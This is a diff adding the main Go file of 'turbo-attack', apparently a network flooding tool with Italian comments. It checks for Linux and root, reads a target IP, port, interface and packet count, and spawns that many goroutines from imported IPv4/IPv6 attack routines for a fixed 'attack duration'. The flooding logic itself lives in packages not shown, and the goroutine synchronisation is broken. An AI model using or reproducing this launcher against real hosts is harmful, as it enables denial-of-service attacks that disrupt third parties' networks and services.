@@ -1,0 +1,96 @@
+package main
+
+import (
+	"fmt"
+	"log"
+	"os"
+	"runtime"
+	"sync"
+	"time"
+
+	"github.com/mytechnotalent/turbo-attack/convert"
+	"github.com/mytechnotalent/turbo-attack/routine"
+	"github.com/mytechnotalent/turbo-attack/sudo"
+)
+
+// Opzioni configurabili
+var (
+	verboseLogging bool
+	attackDuration time.Duration
+)
+
+func init() {
+	// Impostazioni predefinite delle opzioni configurabili
+	verboseLogging = true
+	attackDuration = 10 * time.Second
+}
+
+func main() {
+	// Logging dettagliato
+	logFile, err := os.Create("attack_log.txt")
+	if err != nil {
+		log.Fatal("Impossibile creare il file di log:", err)
+	}
+	defer logFile.Close()
+	log.SetOutput(logFile)
+
+	log.Println("Inizio dell'applicazione")
+
+	// Verifica del sistema operativo
+	if runtime.GOOS != "linux" {
+		log.Fatal("L'applicazione può essere eseguita solo su Linux")
+	}
+
+	// Verifica dei privilegi di root (sudo)
+	err = sudo.Check(0)
+	if err != nil {
+		log.Fatal("L'applicazione deve essere eseguita come root (sudo)")
+	}
+
+	// Analisi degli argomenti della riga di comando
+	if len(os.Args) != 6 {
+		fmt.Println("Usage: turbo-attack_010_linux_arm64 <ethInterface> <ipVersion> <ip> <port> <count>")
+		log.Fatal("Numero errato di argomenti")
+	}
+
+	ethInterface := os.Args[1]
+	ipVersion := os.Args[2]
+	ip := os.Args[3]
+	port := os.Args[4]
+	count := os.Args[5]
+
+	var wg sync.WaitGroup
+
+	// Configurazione opzioni
+	if ipVersion == "4" {
+		ip4Byte, portByte, countInt, err := convert.IP4(&ethInterface, &ip, &port, &count)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		for i := 0; i < *countInt; i++ {
+			wg.Add(1)
+			go routine.IP4(&ethInterface, ip4Byte, portByte)
+			wg.Done()
+		}
+	} else if ipVersion == "6" {
+		ip6Byte, portByte, countInt, err := convert.IP6(&ethInterface, &ip, &port, &count)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		for i := 0; i < *countInt; i++ {
+			go routine.IP6(&ethInterface, ip6Byte, portByte)
+		}
+	} else {
+		log.Fatal("Versione IP non valida. Deve essere '4' o '6'")
+	}
+
+	// Attendi per la durata dell'attacco
+	log.Printf("Attacco in corso per %s", attackDuration)
+	time.Sleep(attackDuration)
+
+	// Fine dell'applicazione
+	log.Println("Fine dell'applicazione")
+	wg.Wait()
+}
